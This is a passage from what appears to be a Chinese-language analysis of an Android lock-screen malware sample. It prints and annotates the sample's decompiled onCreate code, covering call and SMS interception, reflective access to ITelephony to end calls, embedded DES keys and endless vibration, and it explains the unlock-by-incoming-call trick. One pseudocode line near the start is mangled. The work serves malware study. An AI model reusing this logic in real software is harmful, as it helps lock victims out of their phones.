    v6 = md5ByteArray.length()
    v7 = charArray2 = new char[2 * v6]
    for(int v9=0; v9> 4 & 15]
        v13 = v8
        ++v8
        //对单个字节的第二次加密
        v7[v13] = charArray2[v13] = charArray1[md5ByteArray[v9] & 15]
    }
    v12 = new String(charArray2)
    return v12
然后接着分析`s`服务的oncreate方法，先打印日志并通过Intent使用广播发送出去，让包名为`com.aide.ui`的接收，这里动态注册了一个监听接收短信、电话状态的广播,如果有电话拨进来，会将来电电话号码和经过字符串处理的hm资源文件里的字符串进行比较，如果相等就结束前台呼叫、移除newone布局，设置铃声静音，停止服务`s`（很明显是解锁方法），如果不相等则会拦截下这条广播。然后又用`bah.java`、`8e6762e8737463a957dc390bff4eb8e8`两个字符串生成对应的DES加密、解密对象，还有实例化一个`by:彼岸花
qq:1279525738.xml`存储文件的编辑器对象，但是都没有后面的操作，最后执行了重复手机震动操作，每过0.1s震动1.5s
    .method public onCreate()V
              .registers 15
              .annotation system Signature
                  value = {
                      "()V"
                  }
              .end annotation
              .annotation runtime Override
              .end annotation
    00000000  move-object         v0, p0  # v0 = this
    00000002  move-object         v7, v0
    00000004  const-string        v8, "com.aide.ui"
    00000008  invoke-static       ADRTLogCatReader->onContext(Context, String)V, v7, v8  # ADRTLogCatReader.onContext(this, "com.aide.ui")
    0000000E  move-object         v7, v0
    00000010  invoke-super        Service->onCreate()V, v7  # this.Service.onCreate()
    00000016  move-object         v7, v0
    00000018  new-instance        v8, s$IncomingCallReceiver  # 实例化一个IncomingCallReceiver对象
    0000001C  move-object         v13, v8
    0000001E  move-object         v8, v13
    00000020  move-object         v9, v13
    00000022  move-object         v10, v0
    00000024  invoke-direct       s$IncomingCallReceiver->(s)V, v9, v10  # 调用incomingCallReceiver的构造方法进行初始化: new IncomingCallReceiver(this)
    0000002A  iput-object         v8, v7, s->mReceiver:s$IncomingCallReceiver  # this.mReceiver = incomingCallReceiver
    0000002E  new-instance        v7, IntentFilter
    00000032  move-object         v13, v7
    00000034  move-object         v7, v13
    00000036  move-object         v8, v13
    00000038  invoke-direct       IntentFilter->()V, v8  # IntentFilter intentfilter = new IntentFilter()
    0000003E  move-object         v2, v7
    00000040  move-object         v7, v2
    00000042  const-string        v8, "android.intent.action.PHONE_STATE"
    00000046  invoke-virtual      IntentFilter->addAction(String)V, v7, v8
    0000004C  move-object         v7, v2
    0000004E  const-string        v8, "android.provider.Telephony.SMS_RECEIVED"
    00000052  invoke-virtual      IntentFilter->addAction(String)V, v7, v8
    00000058  move-object         v7, v0
    0000005A  move-object         v8, v0
    0000005C  iget-object         v8, v8, s->mReceiver:s$IncomingCallReceiver
    00000060  move-object         v9, v2
    00000062  invoke-virtual      s->registerReceiver(BroadcastReceiver, IntentFilter)Intent, v7, v8, v9  # this.registerReceiver(this.mReceiver, intentfilter)
    00000068  move-result-object  v7
    0000006A  move-object         v7, v0
    0000006C  move-object         v8, v0
    0000006E  const-string        v9, "audio"
    00000072  invoke-virtual      s->getSystemService(String)Object, v8, v9
    00000078  move-result-object  v8
    0000007A  check-cast          v8, AudioManager
    0000007E  iput-object         v8, v7, s->mAudioManager:AudioManager  # this.mAudioManager = this.getSystemService("audio")
    00000082  move-object         v7, v0
    00000084  const-string        v8, "phone"
    00000088  invoke-virtual      s->getSystemService(String)Object, v7, v8
    0000008E  move-result-object  v7
    00000090  check-cast          v7, TelephonyManager
    00000094  move-object         v3, v7
    :96
    00000096  const-string        v7, "android.telephony.TelephonyManager"
    0000009A  invoke-static       Class->forName(String)Class, v7
    :A0
    000000A0  move-result-object  v7
    :A2
    000000A2  const-string        v8, "getITelephony"
    000000A6  const/4             v9, 0
    000000A8  check-cast          v9, [Class
    000000AC  invoke-virtual      Class->getDeclaredMethod(String, [Class)Method, v7, v8, v9  # Method v4 = Class.forName("android.telephony.TelephonyManager").getDeclaredMethod("getITelephony", 0)
    000000B2  move-result-object  v7
    000000B4  move-object         v4, v7
    000000B6  move-object         v7, v4
    000000B8  const/4             v8, 1
    000000BA  invoke-virtual      Method->setAccessible(Z)V, v7, v8  # v4.setAccessible(1)关闭安全检查
    000000C0  move-object         v7, v0
    000000C2  move-object         v8, v4
    000000C4  move-object         v9, v3
    000000C6  const/4             v10, 0
    000000C8  check-cast          v10, [Object
    000000CC  invoke-virtual      Method->invoke(Object, [Object)Object, v8, v9, v10  # v4.invoke(telephoneManager, 0)
    000000D2  move-result-object  v8
    000000D4  check-cast          v8, ITelephony
    000000D8  iput-object         v8, v7, s->iTelephony:ITelephony  # this.iTelephony = v4.invoke(telephoneManager, 0)
    :DC
    000000DC  move-object         v7, v0
    000000DE  new-instance        v8, DU
    000000E2  move-object         v13, v8
    000000E4  move-object         v8, v13
    000000E6  move-object         v9, v13
    000000E8  const-string        v10, "bah.java"
    000000EC  invoke-direct       DU->(String)V, v9, v10
    000000F2  iput-object         v8, v7, s->des:DU  # s.des = new DU("bah.java")
    000000F6  move-object         v7, v0
    :F8
    000000F8  new-instance        v8, DU
    000000FC  move-object         v13, v8
    000000FE  move-object         v8, v13
    00000100  move-object         v9, v13
    00000102  move-object         v10, v0
    00000104  iget-object         v10, v10, s->des:DU
    00000108  const-string        v11, "8e6762e8737463a957dc390bff4eb8e8"
    0000010C  invoke-virtual      DU->decrypt(String)String, v10, v11
    00000112  move-result-object  v10
    00000114  invoke-direct       DU->(String)V, v9, v10
    0000011A  iput-object         v8, v7, s->des:DU  # s.des = new DU(s.des.decrypt("8e6762e8737463a957dc390bff4eb8e8"))
    :11E
    0000011E  move-object         v7, v0
    00000120  move-object         v8, v0
    00000122  move-object         v9, v0
    00000124  iget-object         v9, v9, s->bahk:String
    00000128  const/4             v10, 0
    0000012A  invoke-virtual      s->getSharedPreferences(String, I)SharedPreferences, v8, v9, v10
    00000130  move-result-object  v8
    00000132  iput-object         v8, v7, s->share:SharedPreferences  # this.share = this.getSharedPreferences("by:彼岸花 qq:1279525738", 0)
    00000136  move-object         v7, v0
    00000138  move-object         v8, v0
    0000013A  iget-object         v8, v8, s->share:SharedPreferences
    0000013E  invoke-interface    SharedPreferences->edit()SharedPreferences$Editor, v8
    00000144  move-result-object  v8
    00000146  iput-object         v8, v7, s->editor:SharedPreferences$Editor  # this.editor = this.share.edit()
    0000014A  move-object         v7, v0
    0000014C  invoke-virtual      s->getApplication()Application, v7
    00000152  move-result-object  v7
    00000154  const-string        v8, "vibrator"
    00000158  invoke-virtual      Application->getSystemService(String)Object, v7, v8  # this.getApplication().getSystemService("vibrator")
    0000015E  move-result-object  v7
    00000160  check-cast          v7, Vibrator
    00000164  move-object         v4, v7
    00000166  move-object         v7, v4
    00000168  const/4             v8, 4
    0000016A  new-array           v8, v8, [J  # long[] longArray = new long[4]
    0000016E  move-object         v13, v8
    00000170  move-object         v8, v13
    00000172  move-object         v9, v13
    00000174  const/4             v10, 0
    00000176  const/16            v11, 100  # (long)100
    0000017A  int-to-long         v11, v11
    0000017C  aput-wide           v11, v9, v10  # longArray[0] = (long)100
    00000180  move-object         v13, v8
    00000182  move-object         v8, v13
    00000184  move-object         v9, v13
    00000186  const/4             v10, 1
    00000188  const/16            v11, 1500
    0000018C  int-to-long         v11, v11
    0000018E  aput-wide           v11, v9, v10
    00000192  move-object         v13, v8
    00000194  move-object         v8, v13
    00000196  move-object         v9, v13
    00000198  const/4             v10, 2
    0000019A  const/16            v11, 100
    0000019E  int-to-long         v11, v11
    000001A0  aput-wide           v11, v9, v10
    000001A4  move-object         v13, v8
    000001A6  move-object         v8, v13
    000001A8  move-object         v9, v13
    000001AA  const/4             v10, 3
    000001AC  const/16            v11, 1500
    000001B0  int-to-long         v11, v11
    000001B2  aput-wide           v11, v9, v10  # longArray = new long[]{(long)100, (long)1500, (long)100, (long)1500}
    000001B6  const/4             v9, 0
    000001B8  invoke-virtual      Vibrator->vibrate([J, I)V, v7, v8, v9  # this.getApplication().getSystemService("vibrator").vibrate(longArray, 0)
    000001BE  return-void
    :1C0
    000001C0  move-exception      v7
    000001C2  move-object         v5, v7
    :1C4
    000001C4  new-instance        v7, NoClassDefFoundError
    000001C8  move-object         v13, v7
    000001CA  move-object         v7, v13
    000001CC  move-object         v8, v13
    000001CE  move-object         v9, v5
    000001D0  invoke-virtual      Throwable->getMessage()String, v9
    000001D6  move-result-object  v9
    000001D8  invoke-direct       NoClassDefFoundError->(String)V, v8, v9
    000001DE  throw               v7
    :1E0
    000001E0  move-exception      v7
    000001E2  move-object         v4, v7
    000001E4  goto/16             :DC
    :1E8
    000001E8  move-exception      v7
    000001EA  move-object         v4, v7
    000001EC  goto                :11E
              .catch ClassNotFoundException {:96 .. :A0} :1C0
              .catch Exception {:96 .. :A0} :1E0